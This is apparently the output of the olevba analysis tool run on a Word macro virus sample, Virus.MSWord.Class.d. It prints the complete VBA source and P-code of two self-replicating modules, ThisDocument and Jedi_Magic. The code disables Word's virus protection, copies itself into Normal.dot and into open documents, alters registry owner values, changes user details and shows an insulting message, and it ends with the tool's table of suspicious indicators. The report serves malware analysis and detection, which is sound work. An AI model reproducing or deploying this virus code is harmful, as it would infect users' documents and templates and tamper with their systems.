olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const REG_SZ As Long = 1
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const HKEY_CURRENT_USER As Long = &H80000001
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Sub AutoOpen()
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
On Error GoTo out
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.VirusProtection = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.SaveNormalPrompt = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.ConfirmConversions = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt > 70 And ad > 0 Then GoTo out
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
host.codemodule.AddFromFile ("c:\class.sys")
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 1 To 16
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .deletelines 1
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 1, "Sub AutoClose()"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 91, "Sub ToolsMacro()"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 70 To 81
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
        .deletelines 62
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 35, "    For x = 1 To 4"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegCloseKey(k)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 2 To 104 Step 2
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
out:
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End Sub
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Sub ViewVBCode()
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End Sub
-------------------------------------------------------------------------------
VBA MACRO Jedi_Magic.bas 
in file: ./Virus.MSWord.Class.d - OLE stream: 'Macros/VBA/Jedi_Magic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoOpen"
Options.VirusProtection = False
If Application.UserInitials <> "OBC" Then
    Application.OrganizerCopy Source:= _
    ActiveDocument.FullName, Destination:= _
    NormalTemplate.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Application.UserName = "O.B.1. Canobi"
    Application.UserInitials = "OBC"
    Application.UserAddress = "BOOGZI BARBERS ... Food Buster!!!"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Force" Then num = aVar.Index
Next aVar
If num = 0 Then
    Application.OrganizerCopy Source:= _
    NormalTemplate.FullName, Destination:= _
    ActiveDocument.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Variables.Add Name:="Force", Value:="567374-Joseph.A.D.G."
    ActiveDocument.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12946 bytes
' Line #0:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #1:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #2:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #3:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #4:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #5:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #7:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #8:
' 	Dim (Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #9:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #10:
' 	Dim (Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #11:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #14:
' 	OnError out 
' Line #15:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #21:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #23:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #24:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #25:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #26:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #28:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #31:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #32:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #34:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #38:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #42:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #43:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #47:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #52:
' 	EndWith 
' Line #53:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #54:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #55:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #56:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #58:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #60:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #61:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #62:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #63:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #64:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #65:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #66:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #68:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #74:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #75:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #76:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x0029 "Software\Microsoft\Windows\CurrentVersion"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #77:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #78:
' 	Ld k 
' 	LitStr 0x000F "RegisteredOwner"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0012 "VicodinES /CB /TNN"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #79:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #80:
' 	Ld k 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	LitDI2 0x0000 
' 	Ld REG_SZ 
' 	LitStr 0x0019 "-(Dr. Diet Mountain Dew)-"
' 	LitDI2 0x0001 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #81:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #82:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #83:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #86:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #87:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #89:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #90:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #91:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #92:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #94:
' 	EndWith 
' Line #95:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #96:
' 	Label out 
' Line #97:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #98:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #99:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #100:
' 	EndSub 
' Line #101:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #102:
' 	FuncDefn (Sub ViewVBCode())
' Line #103:
' 	QuoteRem 0x0000 0x0051 "Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors"
' Line #104:
' 	EndSub 
' Macros/VBA/Jedi_Magic - 2155 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #2:
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitStr 0x0003 "OBC"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LineCont 0x000C 05 00 04 00 0B 00 04 00 13 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Jedi_Magic"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #4:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #5:
' 	LitStr 0x000D "O.B.1. Canobi"
' 	Ld Application 
' 	MemSt UserName 
' Line #6:
' 	LitStr 0x0003 "OBC"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #7:
' 	LitStr 0x0021 "BOOGZI BARBERS ... Food Buster!!!"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' Line #10:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0005 "Force"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' Line #11:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LineCont 0x000C 05 00 04 00 0B 00 04 00 13 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Jedi_Magic"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	LitStr 0x0005 "Force"
' 	ParamNamed New 
' 	LitStr 0x0014 "567374-Joseph.A.D.G."
' 	ParamNamed Value 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #15:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

